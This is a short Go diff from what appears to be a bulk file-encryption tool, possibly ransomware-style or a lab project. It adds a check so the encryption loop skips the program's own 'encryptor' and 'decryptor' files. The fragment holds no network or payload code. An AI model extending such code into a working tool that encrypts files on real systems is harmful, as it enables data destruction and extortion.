@@ -29,6 +29,11 @@ func findFiles(root string) ([]string, error) {
 func encryptFiles(files []string, key []byte) {
 	iv := scripts.DynamicKey(16) // AES usa IV de 16 bytes
 	for _, file := range files {
+		// verificar que el archivo no sea el mismo
+		if strings.Contains(file, "encryptor") || strings.Contains(file, "decryptor") {
+			continue
+		}
+
 		data, err := os.ReadFile(file)
 		if err != nil {
 			fmt.Println("Error leyendo archivo:", file, err)
